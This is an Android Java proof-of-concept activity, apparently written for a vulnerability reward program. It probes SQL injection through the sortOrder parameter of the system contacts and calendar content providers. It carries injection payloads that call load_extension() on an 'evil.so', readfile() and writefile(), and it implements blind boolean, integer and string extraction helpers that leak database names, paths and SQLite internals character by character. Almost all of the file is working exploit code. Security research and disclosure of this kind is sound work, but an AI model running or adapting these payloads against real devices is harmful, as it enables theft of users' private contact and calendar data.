package com.vrp.poc;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.LinearLayout;
import android.widget.TextView;

public class SqliteEscActivity extends Activity {
    private static final String TAG = "SqliteEsc";
    private TextView logView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20, 20, 20, 20);
        logView = new TextView(this);
        logView.setTextSize(7);
        logView.setText("SQLite Escalation via sortOrder\n");
        logView.append("UID: " + android.os.Process.myUid() + "\n\n");
        ll.addView(logView);
        sv.addView(ll);
        setContentView(sv);
        new Thread(this::runTests).start();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> logView.append(msg + "\n"));
    }

    private void runTests() {
        testLoadExtension();
        testFileOps();
        testInfoFunctions();
        testWriteAttempts();
        testCrossDbAccess();
        log("\n=== ALL ESCALATION TESTS COMPLETE ===");
    }

    private void testLoadExtension() {
        log("=== TEST 1: SQLite load_extension() ===\n");

        String[] payloads = {
            "load_extension('/data/local/tmp/evil.so')",
            "load_extension('/system/lib64/libsqlite.so','sqlite3_extension_init')",
            "load_extension(char(47,100,97,116,97))"
        };

        for (String payload : payloads) {
            try {
                Cursor c = getContentResolver().query(
                    Uri.parse("content://com.android.contacts/contacts"),
                    new String[]{"_id"},
                    null, null,
                    "CASE WHEN " + payload + " THEN _id END"
                );
                if (c != null) {
                    log("[CRITICAL] load_extension succeeded: " + c.getCount() + " rows");
                    c.close();
                }
            } catch (Exception e) {
                log("load_extension: " + shorten(e.getMessage(), 80));
            }
        }
    }

    private void testFileOps() {
        log("\n=== TEST 2: SQLite file functions ===\n");

        // readfile() — reads file from disk into blob
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://com.android.contacts/contacts"),
                new String[]{"_id"},
                null, null,
                "CASE WHEN (SELECT length(readfile('/etc/hosts')))>0 THEN _id END"
            );
            if (c != null) {
                log("[CRITICAL] readfile() executed: " + c.getCount() + " rows");
                c.close();
            }
        } catch (Exception e) {
            log("readfile: " + shorten(e.getMessage(), 80));
        }

        // writefile() — writes blob to file
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://com.android.contacts/contacts"),
                new String[]{"_id"},
                null, null,
                "CASE WHEN writefile('/data/local/tmp/pwned','test')=4 THEN _id END"
            );
            if (c != null) {
                log("[CRITICAL] writefile() executed: " + c.getCount() + " rows");
                c.close();
            }
        } catch (Exception e) {
            log("writefile: " + shorten(e.getMessage(), 80));
        }
    }

    private void testInfoFunctions() {
        log("\n=== TEST 3: SQLite info extraction ===\n");

        // sqlite_version()
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://com.android.contacts/contacts"),
                new String[]{"_id"},
                null, null,
                "(SELECT unicode(substr(sqlite_version(),1,1)))"
            );
            if (c != null) {
                log("[INFO] sqlite_version query executed: " + c.getCount() + " rows");
                // Extract version
                String ver = blindExtract(
                    "content://com.android.contacts/contacts",
                    "sqlite_version()", 10);
                log("[INFO] SQLite version: " + ver);
                c.close();
            }
        } catch (Exception e) {
            log("sqlite_version: " + shorten(e.getMessage(), 80));
        }

        // sqlite_source_id()
        try {
            String srcId = blindExtract(
                "content://com.android.contacts/contacts",
                "sqlite_source_id()", 30);
            log("[INFO] SQLite source_id: " + srcId);
        } catch (Exception e) {
            log("source_id: " + shorten(e.getMessage(), 80));
        }

        // sqlite_compileoption_used
        String[] options = {"ENABLE_LOAD_EXTENSION", "ENABLE_FTS5", "ENABLE_JSON1",
            "ENABLE_RTREE", "THREADSAFE", "ENABLE_DBSTAT_VTAB", "SECURE_DELETE"};
        for (String opt : options) {
            try {
                boolean enabled = blindBool(
                    "content://com.android.contacts/contacts",
                    "(SELECT sqlite_compileoption_used('" + opt + "'))=1"
                );
                log("[INFO] compile option " + opt + ": " + enabled);
            } catch (Exception e) {
                log("option " + opt + ": " + shorten(e.getMessage(), 50));
            }
        }
    }

    private void testWriteAttempts() {
        log("\n=== TEST 4: Write attempts via sortOrder ===\n");

        // Can we INSERT via sortOrder using a subquery?
        // This shouldn't work but let's verify
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://com.android.calendar/events"),
                new String[]{"_id"},
                null, null,
                "CASE WHEN (SELECT count(*) FROM Events WHERE title='INJECTED_BY_POC')=0 THEN _id END"
            );
            if (c != null) {
                log("Write pre-check query executed: " + c.getCount());
                c.close();
            }
        } catch (Exception e) {
            log("Write pre-check: " + shorten(e.getMessage(), 80));
        }

        // Try REPLACE function in sortOrder (this is just the string function, not SQL REPLACE)
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://com.android.calendar/events"),
                new String[]{"_id", "title"},
                null, null,
                "replace(title, 'Meeting', 'HACKED')"
            );
            if (c != null) {
                log("[INFO] REPLACE function in sort: " + c.getCount() + " rows");
                if (c.moveToFirst()) {
                    log("  First title: " + c.getString(1));
                }
                c.close();
            }
        } catch (Exception e) {
            log("REPLACE sort: " + shorten(e.getMessage(), 80));
        }
    }

    private void testCrossDbAccess() {
        log("\n=== TEST 5: Cross-database access ===\n");

        // Check if ATTACH DATABASE works (it shouldn't in query context)
        // But check if the contacts DB has any attached databases
        try {
            int dbCount = blindInt(
                "content://com.android.contacts/contacts",
                "(SELECT count(*) FROM pragma_database_list)"
            );
            log("[INFO] Attached databases: " + dbCount);

            // Extract database names
            for (int i = 0; i < Math.min(dbCount, 5); i++) {
                String name = blindExtract(
                    "content://com.android.contacts/contacts",
                    "(SELECT name FROM pragma_database_list LIMIT 1 OFFSET " + i + ")",
                    30);
                String file = blindExtract(
                    "content://com.android.contacts/contacts",
                    "(SELECT file FROM pragma_database_list LIMIT 1 OFFSET " + i + ")",
                    80);
                log("[INFO] DB " + i + ": name=" + name + " file=" + file);
            }
        } catch (Exception e) {
            log("pragma_database_list: " + shorten(e.getMessage(), 80));
        }

        // Check database path
        try {
            // Get the number of pages (to estimate size)
            int pages = blindInt(
                "content://com.android.contacts/contacts",
                "(SELECT page_count FROM pragma_page_count)"
            );
            int pageSize = blindInt(
                "content://com.android.contacts/contacts",
                "(SELECT page_size FROM pragma_page_size)"
            );
            log("[INFO] DB size: " + pages + " pages x " + pageSize + " bytes = " + (pages * pageSize / 1024) + " KB");
        } catch (Exception e) {
            log("page_count: " + shorten(e.getMessage(), 80));
        }

        // Check CalendarProvider DB info
        try {
            int calDbCount = blindInt(
                "content://com.android.calendar/events",
                "(SELECT count(*) FROM pragma_database_list)"
            );
            log("[INFO] Calendar attached databases: " + calDbCount);
            for (int i = 0; i < Math.min(calDbCount, 5); i++) {
                String name = blindExtract(
                    "content://com.android.calendar/events",
                    "(SELECT name FROM pragma_database_list LIMIT 1 OFFSET " + i + ")",
                    20);
                String file = blindExtract(
                    "content://com.android.calendar/events",
                    "(SELECT file FROM pragma_database_list LIMIT 1 OFFSET " + i + ")",
                    80);
                log("[INFO] CalendarDB " + i + ": name=" + name + " file=" + file);
            }
        } catch (Exception e) {
            log("Calendar DB list: " + shorten(e.getMessage(), 80));
        }
    }

    private boolean blindBool(String uri, String condition) {
        try {
            Cursor c = getContentResolver().query(
                Uri.parse(uri),
                new String[]{"_id"},
                null, null,
                "CASE WHEN " + condition + " THEN _id ELSE _id END ASC"
            );
            if (c != null) { c.close(); return true; }
        } catch (Exception e) { }
        return false;
    }

    private int blindInt(String uri, String subquery) {
        int lo = 0, hi = 100000;
        if (!blindBool(uri, subquery + ">0")) return 0;
        while (lo < hi) {
            int mid = (lo + hi + 1) / 2;
            if (blindBool(uri, subquery + ">=" + mid)) lo = mid;
            else hi = mid - 1;
            if (hi - lo <= 1) {
                if (blindBool(uri, subquery + "=" + hi)) return hi;
                return lo;
            }
        }
        return lo;
    }

    private String blindExtract(String uri, String subquery, int maxLen) {
        StringBuilder sb = new StringBuilder();
        int len = blindInt(uri, "(SELECT length(" + subquery + "))");
        if (len == 0) return "(empty)";
        len = Math.min(len, maxLen);
        for (int pos = 1; pos <= len; pos++) {
            String expr = "(SELECT unicode(substr(" + subquery + "," + pos + ",1)))";
            int lo = 32, hi = 126;
            while (lo < hi) {
                int mid = (lo + hi + 1) / 2;
                if (blindBool(uri, expr + ">=" + mid)) lo = mid;
                else hi = mid - 1;
            }
            if (blindBool(uri, expr + "=" + lo)) sb.append((char) lo);
            else sb.append('?');
        }
        return sb.toString();
    }

    private String shorten(String s, int max) {
        if (s == null) return "null";
        return s.length() > max ? s.substring(0, max) + "..." : s;
    }
}
